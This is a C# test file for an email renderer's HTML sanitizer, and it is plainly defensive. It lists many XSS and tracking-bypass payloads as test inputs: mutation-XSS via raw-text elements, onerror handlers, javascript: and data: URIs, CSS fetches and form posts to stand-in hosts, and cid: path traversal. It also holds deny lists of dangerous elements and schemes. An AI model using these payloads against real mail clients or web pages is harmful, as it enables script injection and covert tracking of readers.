using System.Text;
using Mailbox.Rendering;
using MimeKit;
using MimeKit.Text;

namespace Mailbox.Tests;

/// <summary>
/// The adversarial corpus: markup written to break the sanitizer rather than to confirm it.
/// </summary>
/// <remarks>
/// <b>What is different about these from the sanitizer's own tests.</b> Those assert that a named
/// bad thing is absent from the output — <c>&lt;script</c> is not there, <c>evil.example</c> is not
/// there — which only ever catches what somebody thought to name. These re-parse the document the
/// sanitizer produced and judge it as a whole: no element outside what a message may draw, no
/// attribute that runs anything, and no address left for the engine to fetch, whatever the input
/// was. A case that walks around the sanitizer in a way nobody has thought of still fails here,
/// because the verdict is taken from the output rather than from a list.
/// <para>
/// <b>Why re-parsing is the point.</b> The class of fault this corpus exists for is markup that
/// means one thing to the tokenizer the sanitizer reads with and another to the parser the
/// rendering engine writes with. Four characters of it — <c>&lt;xmp&gt;</c> — turned the whole
/// allowlist off: the element is not one the sanitizer keeps, so its tag was dropped and its
/// "text" written through, and the tokenizer hands back the insides of a raw-text element as
/// source rather than as text. <c>&lt;xmp&gt;&lt;script&gt;…&lt;/script&gt;&lt;/xmp&gt;</c>
/// reached the engine as a script element. Judging the output by re-parsing it is what finds that;
/// asserting on strings is what missed it.
/// </para>
/// <para>
/// Every address here is invented. <c>tracker.example</c> and <c>evil.example</c> resolve nowhere
/// and are never fetched — nothing in this project has a network stack.
/// </para>
/// </remarks>
public class AuditSanitizerCorpusTests
{
    /// <summary>
    /// Elements that must never appear in a rendered message, judged after re-parsing.
    /// </summary>
    /// <remarks>
    /// The ones that run code, fetch, navigate, post, or change how the rest of the document is
    /// parsed — plus the four raw-text elements whose contents are the bypass above, which must
    /// arrive as text or not at all.
    /// </remarks>
    private static readonly HashSet<string> NeverInAMessage = new(StringComparer.OrdinalIgnoreCase)
    {
        "script", "iframe", "frame", "frameset", "object", "embed", "applet", "form", "input",
        "button", "select", "option", "optgroup", "textarea", "label", "fieldset", "legend",
        "base", "link", "meta", "title", "svg", "math", "template", "canvas", "audio", "video",
        "source", "track", "param", "map", "area", "portal", "slot", "dialog", "marquee",
        "xmp", "plaintext", "noembed", "noframes", "noscript", "keygen", "isindex", "html",
        "head", "body",
    };

    /// <summary>What a stylesheet must never hold once it has been scrubbed.</summary>
    private static readonly string[] NeverInAStylesheet =
    [
        "@import", "@font-face", "@charset", "@namespace", "expression(", "behavior",
        "-moz-binding", "http://", "https://",
    ];

    // ---- The corpus ----------------------------------------------------------------------------

    /// <summary>
    /// Every case, run through the whole judgement below. One theory rather than one test each:
    /// the rules are the same for all of them, and a case is a line rather than a method.
    /// </summary>
    [Theory]
    // Raw-text and plain-text elements: the tokenizer hands their contents back as source.
    [InlineData("<xmp><script>alert(1)</script></xmp>")]
    [InlineData("<xmp><img src=x onerror=alert(1)></xmp>")]
    [InlineData("<XMP><img src=\"https://tracker.example/p.gif\"></XMP>")]
    [InlineData("<xmp class=x><iframe src=\"https://evil.example/\"></iframe></xmp>")]
    [InlineData("<xmp><style>@import url(https://tracker.example/x.css);</style></xmp>")]
    [InlineData("<noembed><img src=x onerror=alert(1)></noembed>")]
    [InlineData("<noframes><style>p{background:url(https://tracker.example/a.png)}</style></noframes>")]
    [InlineData("<p>a</p><plaintext><img src=x onerror=alert(1)>")]
    [InlineData("<noscript><img src=x onerror=alert(1)></noscript>")]
    [InlineData("<textarea><img src=x onerror=alert(1)></textarea>")]
    [InlineData("<title><img src=x onerror=alert(1)></title>")]
    [InlineData("<iframe><img src=x onerror=alert(1)></iframe>")]
    [InlineData("<listing><img src=x onerror=alert(1)></listing>")]

    // Character references: a sanitizer that writes decoded text out unescaped is a sanitizer
    // whose own output is the payload.
    [InlineData("&lt;img src=x onerror=alert(1)&gt;")]
    [InlineData("&#60;img src=x onerror=alert(1)&#62;")]
    [InlineData("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;")]
    [InlineData("<a href=\"javascript&#58;alert(1)\">x</a>")]
    [InlineData("<a href=\"&#106;avascript:alert(1)\">x</a>")]
    [InlineData("<p style=\"background:url(&#106;avascript:alert(1))\">x</p>")]

    // Comments, CDATA and the bogus-comment state.
    [InlineData("<!--><img src=x onerror=alert(1)>")]
    [InlineData("<!--[if gte IE 4]><script>alert(1)</script><![endif]-->")]
    [InlineData("<![CDATA[<img src=x onerror=alert(1)>]]>")]
    [InlineData("<!-- <!-- --><img src=x onerror=alert(1)>")]
    [InlineData("<?xml><img src=x onerror=alert(1)>")]
    [InlineData("<!--x--!><img src=\"https://tracker.example/p.gif\">")]

    // SVG, MathML and namespace confusion.
    [InlineData("<svg><script>alert(1)</script></svg>")]
    [InlineData("<svg><use href=\"https://evil.example/x.svg#a\"/></svg>")]
    [InlineData("<svg><foreignObject><img src=\"https://evil.example/p.png\"></foreignObject></svg>")]
    [InlineData("<svg><animate attributeName=\"href\" values=\"javascript:alert(1)\"/></svg>")]
    [InlineData("<svg><style><img src=\"https://evil.example/p.png\"></style></svg>")]
    [InlineData("<svg/><img src=\"https://evil.example/p.png\">")]
    [InlineData("<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>")]
    [InlineData("<svg><p></svg><img src=x onerror=alert(1)>")]

    // CSS: everything that fetches, however it is spelled.
    [InlineData("<style>p{background:url(https://tracker.example/a.png)}</style>")]
    [InlineData("<style>@import \"https://tracker.example/x.css\";</style>")]
    [InlineData("<style>@import url(https://tracker.example/x.css);</style>")]
    [InlineData("<style>@IMPORT url(\"https://tracker.example/x.css\");</style>")]
    [InlineData("<style>@import url(https://tracker.example/x.css) screen;</style>")]
    [InlineData("<style>@import \"https://tracker.example/x.css\"</style>")]
    [InlineData("<style>@supports(display:grid){@import url(https://tracker.example/x.css);}</style>")]
    [InlineData("<style>@font-face{font-family:a;src:url(https://tracker.example/f.woff)}</style>")]
    [InlineData("<style>@font-face{font-family:a;src:\"https://tracker.example/f.woff\"}</style>")]
    [InlineData("<style>p{background-image:image-set(\"https://tracker.example/a.png\" 1x)}</style>")]
    [InlineData("<style>p{background:-webkit-image-set(\"https://tracker.example/a.png\" 1x)}</style>")]
    [InlineData("<style>p{background-image:image-set(url(\"https://tracker.example/a.png\") 1x)}</style>")]
    [InlineData("<style>p{background:\\75 rl(\"https://tracker.example/a.png\")}</style>")]
    [InlineData("<style>p{background:u\\72 l(\"https://tracker.example/a.png\")}</style>")]
    [InlineData("<style>p{background:url(https\\3a //tracker.example/a.png)}</style>")]
    [InlineData("<style>p{background-image:image-set(\"https\\3a //tracker.example/a.png\" 1x)}</style>")]
    [InlineData("<style>p{background:url (\"https://tracker.example/a.png\")}</style>")]
    [InlineData("<style>p{background:url(\"https://tracker.example/a).png\")}</style>")]
    [InlineData("<style>:root{--x:url(https://tracker.example/a.png)}p{background:var(--x)}</style>")]
    [InlineData("<style>input[value^=\"a\"]{background:url(https://tracker.example/a)}</style>")]
    [InlineData("<style>p{cursor:url(https://tracker.example/c.cur),auto}</style>")]
    [InlineData("<style>li{list-style-image:url(https://tracker.example/a.png)}</style>")]
    [InlineData("<style>p{mask-image:url(https://tracker.example/a.png)}</style>")]
    [InlineData("<style>p:before{content:url(https://tracker.example/a.png)}</style>")]
    [InlineData("<style>p{width:expression(alert(1))}</style>")]
    [InlineData("<style>p{-moz-binding:url(https://tracker.example/x.xml)}</style>")]
    [InlineData("<style>p{beh\\61 vior:url(#x)}</style>")]
    [InlineData("<style>p{behav/**/ior:url(#x)}</style>")]
    [InlineData("<style>p{color:red}</style ><img src=\"https://tracker.example/p.gif\">")]
    [InlineData("<style>p:after{content:\"</style><img src=https://tracker.example/p.gif>\"}</style>")]
    [InlineData("<style><style>p{background:url(https://tracker.example/a.png)}</style></style>")]
    [InlineData("<p>Before</p><style>p{background:url(https://tracker.example/a.png)}")]
    [InlineData("<p style=\"background:url(https://tracker.example/a.png)\">x</p>")]
    [InlineData("<p style=\"@import 'https://tracker.example/x.css'\">x</p>")]

    // Meta refresh, base, and the forms.
    [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">")]
    [InlineData("<base href=\"https://evil.example/\"><img src=\"a.png\">")]
    [InlineData("<p>x</p><base href=\"https://evil.example/\">")]
    [InlineData("<form action=\"https://evil.example\" method=\"post\"><input name=\"p\">"
                + "<button formaction=\"https://evil.example\">go</button></form>")]
    [InlineData("<input form=\"f\" name=\"p\"><form id=\"f\" action=\"https://evil.example\"></form>")]
    [InlineData("<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>")]
    [InlineData("<p srcdoc=\"x\">y</p>")]

    // Event handlers, spelled every way a tokenizer will still read.
    [InlineData("<p onclick =\"alert(1)\">x</p>")]
    [InlineData("<p\nonclick=\"alert(1)\">x</p>")]
    [InlineData("<p/onclick=\"alert(1)\">x</p>")]
    [InlineData("<p OnClIcK=\"alert(1)\">x</p>")]
    [InlineData("<p formaction=\"javascript:alert(1)\">x</p>")]

    // Script and document schemes in every attribute that takes one.
    [InlineData("<a href=\"javascript:alert(1)\">x</a>")]
    [InlineData("<a href=\"java\tscript:alert(1)\">x</a>")]
    [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>")]
    [InlineData("<a href=\"data:image/svg+xml,<svg onload=alert(1)>\">x</a>")]
    [InlineData("<img src=\"javascript:alert(1)\">")]
    [InlineData("<img src=\"data:text/html,<script>alert(1)</script>\">")]
    [InlineData("<div background=\"https://tracker.example/a.png\">x</div>")]
    [InlineData("<table><tr><td background=\"https://tracker.example/a.png\">x</td></tr></table>")]
    [InlineData("<div poster=\"https://tracker.example/a.png\">x</div>")]
    [InlineData("<blockquote cite=\"javascript:alert(1)\">x</blockquote>")]
    [InlineData("<img srcset=\"https://tracker.example/p.gif 1x\" src=\"cid:none\">")]
    [InlineData("<img dynsrc=\"https://tracker.example/a\">")]

    // Malformed markup, which is where a parser and a sanitizer stop agreeing.
    [InlineData("<listing><p title=\"</listing><img src=x onerror=alert(1)>\">x</p></listing>")]
    [InlineData("<select><option><style></option></select><img src=x onerror=alert(1)></style>")]
    [InlineData("<form><div></form><img src=x onerror=alert(1)></div>")]
    [InlineData("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">")]
    [InlineData("<<img src=x onerror=alert(1)>")]
    [InlineData("<img src=\"x\" \"onerror=alert(1)\">")]
    [InlineData("<p title=\"x>y\">z</p>")]
    [InlineData("<scr\0ipt>alert(1)</scr\0ipt>")]
    [InlineData("<img\0 src=x onerror=alert(1)>")]
    [InlineData("<p title=\"unterminated")]
    [InlineData("</ img src=x>")]
    [InlineData("</script><img src=\"https://tracker.example/p.gif\">")]
    [InlineData("<p title=\"<script>alert(1)</script>\">x</p>")]

    // cid:, which is a lookup rather than a fetch, and must stay one.
    [InlineData("<img src=\"cid:\">")]
    [InlineData("<img src=\"cid:../../../etc/passwd\">")]
    [InlineData("<img src=\"cid:%2e%2e%2f%2e%2e%2fpasswd\">")]
    public void NothingThatFetchesOrRunsSurvivesTheCorpus(string html)
        => Judge(MessageRenderer.RenderHtml(html).Html);

    // ---- The classes, stated one at a time ------------------------------------------------------

    /// <summary>
    /// The insides of a raw-text element reach the reader as words, never as markup.
    /// </summary>
    /// <remarks>
    /// The minimal repro of the bypass this corpus was written to find. A browser draws the
    /// contents of <c>&lt;xmp&gt;</c> literally; so must this.
    /// </remarks>
    [Theory]
    [InlineData("xmp")]
    [InlineData("noembed")]
    [InlineData("noframes")]
    public void ARawTextElementsContentsAreWordsAndNotMarkup(string element)
    {
        var body = Body($"<{element}><script>alert(1)</script></{element}>");

        Assert.Contains("&lt;script&gt;", body, StringComparison.Ordinal);
        Assert.DoesNotContain("<script", body, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>Everything after <c>&lt;plaintext&gt;</c> is text, and there is no way back.</summary>
    [Fact]
    public void EverythingAfterPlaintextIsText()
    {
        var body = Body("<p>Before</p><plaintext><img src=\"https://tracker.example/p.gif\">");

        Assert.Contains("<p>Before</p>", body, StringComparison.Ordinal);
        Assert.Contains("&lt;img", body, StringComparison.Ordinal);
        Assert.DoesNotContain("<img", body, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// A stylesheet fetches by more than <c>url()</c>, and everything it fetches by is refused.
    /// </summary>
    /// <remarks>
    /// <c>image-set()</c> takes bare strings, and a CSS escape spells the same token differently.
    /// A rewriter that knows only the literal <c>url(</c> left both in the document.
    /// </remarks>
    [Theory]
    [InlineData("<style>p{background-image:image-set(\"https://tracker.example/a.png\" 1x)}</style>")]
    [InlineData("<style>p{background:-webkit-image-set(\"https://tracker.example/a.png\" 1x)}</style>")]
    [InlineData("<style>p{background:\\75 rl(\"https://tracker.example/a.png\")}</style>")]
    [InlineData("<style>@font-face{src:\"https://tracker.example/f.woff\"}</style>")]
    public void ACssFetchThatIsNotAUrlFunctionIsRefusedAndCounted(string html)
    {
        var rendered = MessageRenderer.RenderHtml(html);

        Assert.DoesNotContain("tracker.example", rendered.Html, StringComparison.OrdinalIgnoreCase);
        Assert.Equal(["tracker.example"], rendered.Hosts);
    }

    /// <summary>
    /// A host named by an at-rule that was dropped is still a host the message tried to reach.
    /// </summary>
    /// <remarks>
    /// The tracker report is the reader's answer to "who was this message going to tell?".
    /// <c>@import</c> and <c>@font-face</c> were removed before the counter ever saw them, so a
    /// message whose only reach was an <c>@import</c> reported that it had asked for nothing.
    /// </remarks>
    [Theory]
    [InlineData("<style>@import url(https://tracker.example/x.css);</style><p>x</p>")]
    [InlineData("<style>@import \"https://tracker.example/x.css\";</style><p>x</p>")]
    [InlineData("<style>@font-face{font-family:a;src:url(https://tracker.example/f.woff)}</style><p>x</p>")]
    public void AHostInsideADroppedAtRuleIsStillReported(string html)
    {
        var rendered = MessageRenderer.RenderHtml(html);

        Assert.True(rendered.HasRemoteContent);
        Assert.Equal(["tracker.example"], rendered.Hosts);
    }

    /// <summary>One reference is one refusal, however many spellings it was found by.</summary>
    /// <remarks>
    /// A report that counted an <c>@import</c> twice would be a report that invents, which is the
    /// same fault as one that omits and harder to notice.
    /// </remarks>
    [Fact]
    public void AReferenceIsCountedOnce()
    {
        var rendered = MessageRenderer.RenderHtml(
            "<style>@import url(https://tracker.example/x.css);</style>");

        Assert.Single(rendered.Blocked);
    }

    /// <summary>
    /// A <c>cid:</c> reference inlines a picture and nothing else.
    /// </summary>
    /// <remarks>
    /// Every attribute that reaches the resolver draws an image. Inlining a part by whatever type
    /// it declared turned <c>&lt;img src="cid:doc"&gt;</c> into a <c>data:text/html</c> document —
    /// the thing the data-URI rule refuses, reached by the other road — and a reference by file
    /// name inlined an attachment.
    /// </remarks>
    [Fact]
    public void OnlyAPictureIsInlinedFromTheMessage()
    {
        var page = new MimePart("text", "html")
        {
            ContentId = "doc",
            Content = new MimeContent(new MemoryStream("<b>x</b>"u8.ToArray())),
        };

        var attachment = new MimePart("application", "pdf")
        {
            FileName = "agenda.pdf",
            Content = new MimeContent(new MemoryStream([1, 2, 3, 4])),
        };

        var picture = new MimePart("image", "png")
        {
            ContentId = "logo",
            Content = new MimeContent(new MemoryStream([137, 80, 78, 71, 13, 10, 26, 10])),
        };

        var message = new MimeMessage { Subject = "cid" };
        message.From.Add(new MailboxAddress("A. Person", "you@example.com"));
        message.Body = new Multipart("related")
        {
            new TextPart("html")
            {
                Text = "<img src=\"cid:doc\"><img src=\"cid:agenda.pdf\"><img src=\"cid:logo\">",
            },
            page,
            attachment,
            picture,
        };

        var html = MessageRenderer.Render(message).Html;

        Assert.DoesNotContain("data:text/html", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("data:application/pdf", html, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("data:image/png;base64,", html, StringComparison.Ordinal);
    }

    /// <summary>
    /// A stylesheet whose end tag never comes is still scrubbed, and still counted.
    /// </summary>
    /// <remarks>
    /// Dropped whole, it took its hosts with it: the message reached for a server and the report
    /// said it had reached for nothing.
    /// </remarks>
    [Fact]
    public void AnUnclosedStylesheetIsScrubbedRatherThanDropped()
    {
        var rendered = MessageRenderer.RenderHtml(
            "<p>Before</p><style>p{background:url(https://tracker.example/a.png)}");

        Assert.Contains("Before", rendered.Html, StringComparison.Ordinal);
        Assert.DoesNotContain("tracker.example", rendered.Html, StringComparison.OrdinalIgnoreCase);
        Assert.Equal(["tracker.example"], rendered.Hosts);
    }

    /// <summary>
    /// Ordinary mail is not collateral: what the corpus refuses, a real message still keeps.
    /// </summary>
    /// <remarks>
    /// A sanitizer can pass every case above by emitting nothing. This is the other half of the
    /// claim — the shape most commercial mail takes still arrives styled, linked and legible.
    /// </remarks>
    [Fact]
    public void RealMailStillSurvivesAllOfThat()
    {
        var body = Body(
            "<html><head><style>.lead{color:#336699;font-size:15px}"
            + ".rule{border-top:1px solid #cccccc}</style></head><body>"
            + "<div class=\"wrap\"><p class=\"lead\">Three things worth your time.</p>"
            + "<div class=\"rule\"></div>"
            + "<p><a href=\"https://example.com/story/1\">The first story</a></p>"
            + "<table><tr><td align=\"center\" bgcolor=\"#f5f5f5\">A cell</td></tr></table>"
            + "<p><img src=\"data:image/png;base64,AAAA\" width=\"120\" alt=\"a logo\"></p>"
            + "<p>Punctuation &amp; entities &#8212; kept.</p></div></body></html>");

        Assert.Contains("#336699", body, StringComparison.Ordinal);
        Assert.Contains("class=\"lead\"", body, StringComparison.Ordinal);
        Assert.Contains("href=\"https://example.com/story/1\"", body, StringComparison.Ordinal);
        Assert.Contains("bgcolor=\"#f5f5f5\"", body, StringComparison.Ordinal);
        Assert.Contains("data:image/png;base64,AAAA", body, StringComparison.Ordinal);
        Assert.Contains("Punctuation &amp; entities — kept.", body, StringComparison.Ordinal);
    }

    // ---- The judgement --------------------------------------------------------------------------

    /// <summary>
    /// Re-parses a rendered document and holds it to what a message may contain.
    /// </summary>
    /// <remarks>
    /// The document's own frame is skipped by starting at the body: it carries a
    /// <c>&lt;meta charset&gt;</c>, a content policy and the pane's stylesheet, none of which came
    /// from the message.
    /// </remarks>
    private static void Judge(string document)
    {
        var body = Between(document);
        var tokenizer = new HtmlTokenizer(new StringReader(body));
        var stylesheet = new StringBuilder();
        var inStyle = false;

        while (tokenizer.ReadNextToken(out var token))
        {
            if (token.Kind is HtmlTokenKind.Data or HtmlTokenKind.ScriptData)
            {
                if (inStyle) stylesheet.Append(token);
                continue;
            }

            if (token is not HtmlTagToken tag) continue;

            Assert.False(
                NeverInAMessage.Contains(tag.Name),
                $"<{tag.Name}> survived into the document:\n{body}");

            if (string.Equals(tag.Name, "style", StringComparison.OrdinalIgnoreCase))
            {
                inStyle = !tag.IsEndTag && !tag.IsEmptyElement;
                continue;
            }

            if (tag.IsEndTag) continue;

            foreach (var attribute in tag.Attributes) JudgeAttribute(tag, attribute, body);
        }

        var css = stylesheet.ToString();
        foreach (var forbidden in NeverInAStylesheet)
        {
            Assert.False(
                css.Contains(forbidden, StringComparison.OrdinalIgnoreCase),
                $"a stylesheet kept “{forbidden}”:\n{css}");
        }
    }

    /// <summary>One attribute: nothing that runs, and no address the engine would fetch.</summary>
    private static void JudgeAttribute(HtmlTagToken tag, HtmlAttribute attribute, string body)
    {
        var name = attribute.Name;
        var value = attribute.Value ?? string.Empty;

        Assert.False(
            name.StartsWith("on", StringComparison.OrdinalIgnoreCase),
            $"<{tag.Name} {name}=…> survived:\n{body}");

        foreach (var scheme in new[] { "javascript:", "vbscript:", "data:text/html", "data:application" })
        {
            Assert.False(
                Squashed(value).Contains(scheme, StringComparison.OrdinalIgnoreCase),
                $"<{tag.Name} {name}=…> names {scheme}:\n{body}");
        }

        // A link keeps its destination — a reader clicks it, and the click leaves the pane. Every
        // other attribute must be free of anything the engine would fetch on its own.
        var isLink = string.Equals(tag.Name, "a", StringComparison.OrdinalIgnoreCase)
                     && string.Equals(name, "href", StringComparison.OrdinalIgnoreCase);

        if (isLink) return;

        foreach (var remote in new[] { "http://", "https://", "//" })
        {
            Assert.False(
                value.Contains(remote, StringComparison.OrdinalIgnoreCase) && IsAddress(value),
                $"<{tag.Name} {name}=\"{value}\"> left an address in the document:\n{body}");
        }
    }

    /// <summary>
    /// Whether a value is an address rather than an inlined picture that happens to hold slashes.
    /// </summary>
    private static bool IsAddress(string value)
        => !value.StartsWith("data:", StringComparison.OrdinalIgnoreCase)
           && (value.Contains("http://", StringComparison.OrdinalIgnoreCase)
               || value.Contains("https://", StringComparison.OrdinalIgnoreCase)
               || value.StartsWith("//", StringComparison.Ordinal));

    /// <summary>With whitespace and control characters taken out, as a browser resolves a scheme.</summary>
    private static string Squashed(string value)
        => new([.. value.Where(c => !char.IsWhiteSpace(c) && !char.IsControl(c))]);

    private static string Between(string document)
    {
        var start = document.IndexOf("<body>", StringComparison.Ordinal);
        var end = document.LastIndexOf("</body>", StringComparison.Ordinal);
        return start < 0 || end < 0 ? document : document[(start + "<body>".Length)..end];
    }

    private static string Body(string html) => Between(MessageRenderer.RenderHtml(html).Html);
}
